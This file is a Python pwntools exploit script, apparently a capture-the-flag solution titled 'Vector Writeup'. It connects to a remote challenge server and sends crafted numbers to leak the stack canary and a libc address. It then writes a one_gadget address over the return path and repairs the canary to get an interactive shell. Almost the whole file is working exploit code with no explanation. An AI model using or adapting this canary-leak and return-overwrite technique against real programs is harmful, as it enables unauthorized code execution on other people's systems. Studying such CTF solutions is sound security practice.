from __future__ import division, print_function
import random
from pwn import *

'''
# Vector Writeup
'''

log = False
is_gaibu = True
if is_gaibu:
    host = "34.85.75.40"
    port = 30002
else:
    host = "127.0.0.1"
    port = 3001

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(s, verbose=True):
    s = r.recvuntil(s)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        print(s)
    r.sendline(s)

def interactive():
    r.interactive()

######################################################

def to_odd(x):
    if x % 2 == 0:
        return x + 1
    else:
        return x

BIT = 8

def get_odd(p, q):
    return to_odd(random.getrandbits(BIT))

def factorize_inner(p, q):
    if p <= 2 ** BIT - 1:
        # print(p, q)
        p = to_odd(int(p) + 1)
        if p > q:
            return None
        return [p]

    y = get_odd(p, q)

    p = p / y
    q = q / y
    l = factorize_inner(p, q)
    if l is None:
        return None
    l.append(y)
    return l

def factorize(p, q):
    for i in range(100000):
        maybe_l = factorize_inner(p, q)
        if maybe_l is None:
            continue
        return maybe_l

def mul(*v):
    k = 1
    for x in v:
        k *= x
    return k

def send_values(*vs):
    for v in sorted(vs):
        sendline(str(v))
    sendline(str(0))
    recvline()
    x = int(recvline(), 16)
    return x


'''
0032| 0x7ffc8b1a18b0 --> 0x17c53d0614ef73bd
0040| 0x7ffc8b1a18b8 --> 0x0
0048| 0x7ffc8b1a18c0 --> 0x0
0056| 0x7ffc8b1a18c8 --> 0x0
0064| 0x7ffc8b1a18d0 --> 0x7ffc8b1a19c0 --> 0x1
0072| 0x7ffc8b1a18d8 --> 0x1a985a5a78f31500
0080| 0x7ffc8b1a18e0 --> 0x400bc0 (<__libc_csu_init>:	push   r15)
0088| 0x7ffc8b1a18e8 --> 0x7f03dc096b97 (mov    edi,eax)
'''

def gen_pq(base, exp):
    p = base * exp
    q = (base + 1) * exp
    return p, q

def gen_base(l):
    v = 0
    for x in reversed(l):
        v <<= 64
        v |= x
    return v

recvuntil('enter 0\n')

p, q = gen_pq(1, (2 ** 64) ** 3)
v = factorize(p, q)
x = send_values(*v)
print(v)
s1 = hex(x)[2:]
s2 = hex(mul(*v))[2:]
canary = int(s1.replace(s2, '') + '0', 16)
print('canary:', hex(canary))

p, q = gen_pq(1, (2 ** 64) ** 5)
v = factorize(p, q)
x = send_values(*v)
s1 = hex(x)[2:]
s2 = hex(mul(*v))[2:]
libc_base = int(s1.replace(s2, '')[:-1] + '97', 16) - 0x21b97
print('libc_base:', hex(libc_base))

one_gadget = libc_base + 0x4f322
def divide(x):
    result = []
    i = 0
    while x > 0:
        result.append(((x & 0xff), (0x100 ** i)))
        x >>= 8
        i += 1

    if len(result) == 6:
        result.append((0x10000, (0x100 ** 6)))
    elif len(result) == 7:
        result.append((0x100, (0100 ** 7)))
    elif len(result) == 8:
        pass
    else:
        raise Exception('It is too difficult')
    return list(reversed(result))

def send_x(x, exp):
    p, q = gen_pq(x, exp)
    v = factorize(p, q)
    x = send_values(*v)
    return x

def send_l(l, exp):
    for (x, e) in l:
        x = send_x(x, e * exp)
        # print('x:', hex(x * exp * e))
        # print('x:', hex(mul(*v)))
        # print('x:', hex(x))

def create_buf(v, exp):
    l = divide(v)
    send_l(l, exp)

UNIT = 2 ** 64

create_buf(one_gadget, UNIT ** 5)

# fix canary
l = divide(canary)[:-1]
l[-1] = (l[-1][0] * 0x100, l[-1][1] // 0x100)
send_l(l, UNIT ** 3)

# ret
wait_for_attach()
r.sendline(str(2))

interactive()
